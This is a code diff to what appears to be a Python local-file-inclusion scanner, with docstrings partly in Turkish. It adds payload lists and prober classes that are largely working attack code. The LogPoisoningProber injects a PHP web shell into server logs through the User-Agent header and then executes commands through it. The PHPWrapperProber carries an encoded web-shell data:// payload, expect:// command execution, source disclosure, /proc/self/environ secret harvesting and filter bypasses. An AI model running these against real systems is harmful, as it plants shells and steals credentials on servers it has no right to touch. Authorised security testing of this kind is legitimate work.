@@ -47,6 +47,68 @@ _SENSITIVE_FILES = [
     "C:\\Windows\\System32\\drivers\\etc\\hosts",
 ]
 
+# Extended log files for log-poisoning attempts
+_LOG_POISON_FILES = [
+    "/var/log/apache2/access.log",
+    "/var/log/apache2/error.log",
+    "/var/log/nginx/access.log",
+    "/var/log/auth.log",
+    "/var/log/sshd.log",
+    "/proc/self/fd/1",
+    "/proc/self/fd/2",
+    "/var/log/apache/access.log",
+    "/var/log/httpd/access_log",
+    "/var/log/lighttpd/access.log",
+]
+
+# /proc/self/ traversal targets for env/command/cwd exfil
+_PROC_SELF_FILES = [
+    "/proc/self/environ",
+    "/proc/self/cmdline",
+    "/proc/self/cwd/index.php",
+    "/proc/self/cwd/config.php",
+    "/proc/self/cwd/.env",
+    "/proc/self/maps",
+    "/proc/self/status",
+]
+
+# Windows-specific LFI paths
+_WINDOWS_FILES = [
+    "C:\\Windows\\win.ini",
+    "C:\\Windows\\System32\\drivers\\etc\\hosts",
+    "C:\\boot.ini",
+    "%SYSTEMROOT%\\win.ini",
+    "C:\\Windows\\System32\\config\\sam",
+    "C:\\inetpub\\logs\\LogFiles\\W3SVC1\\ex.log",
+]
+
+# PHP wrapper payloads (expanded)
+_PHP_WRAPPER_PAYLOADS = [
+    "php://filter/convert.base64-encode/resource=index.php",
+    "php://filter/convert.base64-encode/resource=config.php",
+    "php://filter/convert.base64-encode/resource=../config.php",
+    "php://filter/read=string.toupper/resource=index.php",
+    "php://input",
+    "phar://./test.phar/test.txt",
+    "expect://id",
+    "zip://shell.jpg%23shell.php",
+    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+",
+]
+
+# Null-byte bypass suffix (PHP < 5.3.4)
+_NULL_BYTE = "%00"
+
+# Double-encoded traversal sequences
+_DOUBLE_ENCODED_TRAVERSAL = [
+    "%252e%252e%252f",   # double-encoded ../
+    "%252e%252e/",
+    "..%255c",          # double-encoded ..\
+    "%252e%252e%255c",
+]
+
+# Path truncation payload (4096-char padding to bypass basename() checks)
+_PATH_TRUNCATION_PAYLOAD = "../" * 512 + "etc/passwd"
+
 _TRAVERSAL_PREFIXES = (
     ["../" * n for n in range(2, 8)]
     + ["..%2f" * n for n in range(2, 6)]
@@ -63,6 +125,7 @@ _PHP_WRAPPERS = [
     "data://text/plain;base64,",
     "zip://",
     "phar://",
+    "expect://",
 ]
 
 # PHP filter chain for RCE (base64 approach)
@@ -400,12 +463,271 @@ class LFISSHKeyReader(BaseScanner):
 
 
 # ===========================================================================
+# 6. LogPoisoningProber
+# ===========================================================================
+class LogPoisoningProber(BaseScanner):
+    """
+    LFI log poisoning prober (standalone):
+    1. PHP kodunu User-Agent header'ina inject et.
+    2. Tum log dosyalarini LFI ile yukle.
+    3. Basarili ise Critical severity raporla.
+
+    LFILogPoisoningChain'den farki: genisletilmis log listesi ve
+    ayri bir prober sinifi olarak SOLID Single Responsibility'e uygun.
+    """
+    name = "lfi_log_poisoning_prober"
+
+    def run(self, target: str, **kwargs) -> List[Dict]:
+        results: List[Dict] = []
+        uid = _canary()
+        php_shell = f"<?php system($_GET['cmd']); ?> wsp={uid}"
+
+        # Step 1: Inject PHP code via User-Agent into server logs
+        try:
+            self.session.get(target, headers={"User-Agent": php_shell}, timeout=8)
+            logger.debug("[LogPoisoningProber] PHP shell injected via User-Agent")
+        except Exception as exc:
+            logger.debug("[LogPoisoningProber] Injection request failed: %s", exc)
+
+        # Step 2: Try to include each log file via LFI
+        for log_file in _LOG_POISON_FILES:
+            for test_url in _inject_lfi(target, log_file)[:2]:
+                try:
+                    resp = self.session.get(test_url, timeout=8)
+                    body = getattr(resp, "text", "")[:4000]
+                    if uid in body:
+                        # Canary found — log poisoning confirmed
+                        rce_url = test_url + ("&" if "?" in test_url else "?") + "cmd=id"
+                        rce_resp = self.session.get(rce_url, timeout=8)
+                        rce_body = getattr(rce_resp, "text", "")[:500]
+                        rce_confirmed = bool(re.search(r"uid=\d+\(|root:|www-data", rce_body))
+                        finding = {
+                            "vuln_type": "LFI — Log Poisoning (PHP Shell via User-Agent)",
+                            "url": test_url,
+                            "severity": "Critical",
+                            "description": (
+                                f"Log poisoning via User-Agent succeeded. PHP shell canary found in {log_file}. "
+                                + (f"RCE confirmed: {rce_body[:100]!r}" if rce_confirmed
+                                   else "PHP shell in log — RCE probe inconclusive.")
+                            ),
+                            "evidence": {
+                                "log_file": log_file,
+                                "lfi_url": test_url,
+                                "php_shell_injected": php_shell,
+                                "rce_confirmed": rce_confirmed,
+                                "rce_url": rce_url if rce_confirmed else None,
+                                "rce_output": rce_body[:200] if rce_confirmed else None,
+                                "uid_marker": uid,
+                                "status": resp.status_code,
+                            },
+                        }
+                        results.append(finding)
+                        self.report_finding(**finding)
+                        return results
+                except Exception as exc:
+                    logger.debug("[LogPoisoningProber] LFI trigger %s: %s", test_url, exc)
+        return results
+
+
+# ===========================================================================
+# 7. PHPWrapperProber
+# ===========================================================================
+class PHPWrapperProber(BaseScanner):
+    """
+    PHP wrapper prober:
+    - php://filter ile base64 kaynak kod sizintisi (source disclosure)
+    - base64 decode ile PHP kod icerigi cikar
+    - /proc/self/environ ile env variable sizintisi
+    - expect://, phar://, zip:// gibi diger wrapper'lari test et
+    """
+    name = "lfi_php_wrapper_prober"
+
+    # Targets for php://filter source disclosure
+    _FILTER_TARGETS = [
+        "index", "index.php", "config", "config.php",
+        "login", "admin", "db", "database", "connection",
+        "../config", "../settings", "../includes/config",
+    ]
+
+    def run(self, target: str, **kwargs) -> List[Dict]:
+        import base64
+        results: List[Dict] = []
+
+        # --- php://filter base64 source disclosure ---
+        for res_name in self._FILTER_TARGETS:
+            wrapper_val = f"php://filter/convert.base64-encode/resource={res_name}"
+            for test_url in _inject_lfi(target, wrapper_val)[:2]:
+                try:
+                    resp = self.session.get(test_url, timeout=8)
+                    body = getattr(resp, "text", "").strip()
+                    if resp.status_code == 200 and len(body) > 20:
+                        # Attempt base64 decode
+                        try:
+                            decoded = base64.b64decode(body[:4096]).decode("utf-8", errors="replace")
+                        except Exception:
+                            decoded = ""
+                        is_php_source = "<?php" in decoded or "<?=" in decoded
+                        if is_php_source:
+                            finding = {
+                                "vuln_type": "LFI — PHP Wrapper Source Disclosure (php://filter)",
+                                "url": test_url,
+                                "severity": "Critical",
+                                "description": (
+                                    f"php://filter base64 wrapper exposed PHP source of '{res_name}'. "
+                                    "Source code disclosure can reveal credentials, API keys, "
+                                    "database passwords and business logic."
+                                ),
+                                "evidence": {
+                                    "wrapper": wrapper_val,
+                                    "resource": res_name,
+                                    "raw_b64_snippet": body[:100],
+                                    "decoded_snippet": decoded[:300],
+                                    "status": resp.status_code,
+                                },
+                            }
+                            results.append(finding)
+                            self.report_finding(**finding)
+                            return results
+                except Exception as exc:
+                    logger.debug("[PHPWrapperProber] filter %s: %s", wrapper_val, exc)
+
+        # --- /proc/self/environ env variable exfiltration ---
+        for proc_file in _PROC_SELF_FILES[:4]:
+            for test_url in _inject_lfi(target, proc_file)[:2]:
+                try:
+                    resp = self.session.get(test_url, timeout=8)
+                    body = getattr(resp, "text", "")[:3000]
+                    env_hit = re.search(
+                        r"(HTTP_HOST|PATH=|HOME=|USER=|SERVER_ADDR|DB_PASSWORD|SECRET|API_KEY)",
+                        body, re.I
+                    )
+                    if env_hit:
+                        finding = {
+                            "vuln_type": f"LFI — /proc/self/ Exfiltration ({proc_file})",
+                            "url": test_url,
+                            "severity": "Critical",
+                            "description": (
+                                f"LFI of {proc_file!r} reveals environment variables or process info. "
+                                f"Detected pattern: {env_hit.group(0)!r}. "
+                                "May expose secrets, credentials, or internal configuration."
+                            ),
+                            "evidence": {
+                                "proc_file": proc_file,
+                                "matched": env_hit.group(0),
+                                "snippet": body[:300],
+                                "status": resp.status_code,
+                            },
+                        }
+                        results.append(finding)
+                        self.report_finding(**finding)
+                        return results
+                except Exception as exc:
+                    logger.debug("[PHPWrapperProber] proc %s: %s", proc_file, exc)
+
+        # --- expect:// RCE probe ---
+        for expect_cmd in ["id", "whoami"]:
+            expect_val = f"expect://{expect_cmd}"
+            for test_url in _inject_lfi(target, expect_val)[:1]:
+                try:
+                    resp = self.session.get(test_url, timeout=6)
+                    body = getattr(resp, "text", "")[:500]
+                    if re.search(r"uid=\d+\(|root:|www-data|nobody", body):
+                        finding = {
+                            "vuln_type": "LFI — expect:// RCE",
+                            "url": test_url,
+                            "severity": "Critical",
+                            "description": (
+                                f"expect:// PHP stream wrapper executed '{expect_cmd}' on the server. "
+                                "Remote code execution via LFI + expect extension."
+                            ),
+                            "evidence": {
+                                "wrapper": expect_val,
+                                "command": expect_cmd,
+                                "output": body[:200],
+                                "status": resp.status_code,
+                            },
+                        }
+                        results.append(finding)
+                        self.report_finding(**finding)
+                        return results
+                except Exception as exc:
+                    logger.debug("[PHPWrapperProber] expect %s: %s", expect_val, exc)
+
+        # --- Null byte bypass probe (PHP < 5.3.4) ---
+        for tfile in _SENSITIVE_FILES[:4]:
+            null_payload = tfile + _NULL_BYTE
+            for test_url in _inject_lfi(target, null_payload)[:1]:
+                try:
+                    resp = self.session.get(test_url, timeout=8)
+                    body = getattr(resp, "text", "")[:3000]
+                    hit = _lfi_sensitive_content(body)
+                    if hit:
+                        finding = {
+                            "vuln_type": "LFI — Null Byte Bypass (PHP < 5.3.4)",
+                            "url": test_url,
+                            "severity": "Critical",
+                            "description": (
+                                f"LFI null byte bypass (%00) succeeded for {tfile!r}. "
+                                "Target is likely running PHP < 5.3.4 with register_globals or "
+                                "unsafe file-inclusion logic."
+                            ),
+                            "evidence": {
+                                "file": tfile,
+                                "payload": null_payload,
+                                "hit": hit,
+                                "snippet": body[:200],
+                                "status": resp.status_code,
+                            },
+                        }
+                        results.append(finding)
+                        self.report_finding(**finding)
+                        return results
+                except Exception as exc:
+                    logger.debug("[PHPWrapperProber] nullbyte %s: %s", null_payload, exc)
+
+        # --- Double-encode filter bypass probe ---
+        for denc in _DOUBLE_ENCODED_TRAVERSAL[:2]:
+            for tfile in ("/etc/passwd", "etc/passwd"):
+                double_payload = denc + tfile.lstrip("/")
+                for test_url in _inject_lfi(target, double_payload)[:1]:
+                    try:
+                        resp = self.session.get(test_url, timeout=8)
+                        body = getattr(resp, "text", "")[:3000]
+                        hit = _lfi_sensitive_content(body)
+                        if hit:
+                            finding = {
+                                "vuln_type": "LFI — Double-Encoded Traversal Filter Bypass",
+                                "url": test_url,
+                                "severity": "High",
+                                "description": (
+                                    f"Double-encoded path traversal ({denc!r}) bypassed input filters. "
+                                    f"File: {tfile!r}. Content: {hit!r}"
+                                ),
+                                "evidence": {
+                                    "payload": double_payload,
+                                    "file": tfile,
+                                    "hit": hit,
+                                    "snippet": body[:200],
+                                    "status": resp.status_code,
+                                },
+                            }
+                            results.append(finding)
+                            self.report_finding(**finding)
+                            return results
+                    except Exception as exc:
+                        logger.debug("[PHPWrapperProber] doubleenc %s: %s", double_payload, exc)
+
+        return results
+
+
+# ===========================================================================
 # LFIScanner — Orchestrator
 # ===========================================================================
 class LFIScanner(BaseScanner):
     """
-    Adim 8 LFI orchestrator:
+    LFI orchestrator:
     Traversal -> LogPoison -> ProcEnviron -> PHPFilterChain -> SSHKey
+    -> LogPoisoningProber -> PHPWrapperProber
     """
     name = "lfi"
 
@@ -417,6 +739,8 @@ class LFIScanner(BaseScanner):
             LFIProcEnvironRCE(session=self.session, results=self.results),
             LFIPHPFilterChain(session=self.session, results=self.results),
             LFISSHKeyReader(session=self.session, results=self.results),
+            LogPoisoningProber(session=self.session, results=self.results),
+            PHPWrapperProber(session=self.session, results=self.results),
         ]
         for prober in probers:
             try:
